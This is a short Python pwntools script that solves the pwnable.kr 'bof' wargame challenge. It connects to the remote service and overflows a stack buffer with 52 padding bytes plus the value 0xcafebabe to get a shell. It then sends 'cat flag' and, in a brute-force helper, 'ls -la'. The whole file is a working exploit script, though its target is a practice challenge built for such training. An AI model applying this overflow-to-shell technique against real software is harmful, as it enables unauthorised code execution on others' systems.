#!/usr/bin/env python3 
import pwn
import logging
import time
#pwn.context.log_level = logging.ERROR

#s = pwn.ssh("", "pwnable.kr", 2222, "guest")
#sh = s.shell()
#p = s.process(["./bof"])
p = pwn.process(["nc", "pwnable.kr", "9000"])
#p = pwn.remote("pwnable.kr", "9000")
#p = pwn.process(["./"])

def solve():
	for i in range(32, 32 + 40, 4):
		print ("i = ", i)
		p = pwn.process(["./bof"])
		p.sendline("a" * i + "\xca\xfe\xba\xbe"[::-1])
		p.sendline("ls -la")
		try:
			while True:
				print (p.recvline().decode("utf-8"))
		except EOFError:
			pass

p.sendline("a" * 52 + "\xca\xfe\xba\xbe"[::-1])
while True:
	p.sendline("cat flag")
	time.sleep(1)
	if not p.can_recv():
		continue
	print (p.recvline().decode("utf-8"))
	break

#print ("\n".join([p.recvall().decode("utf-8") for i in range(1)]))
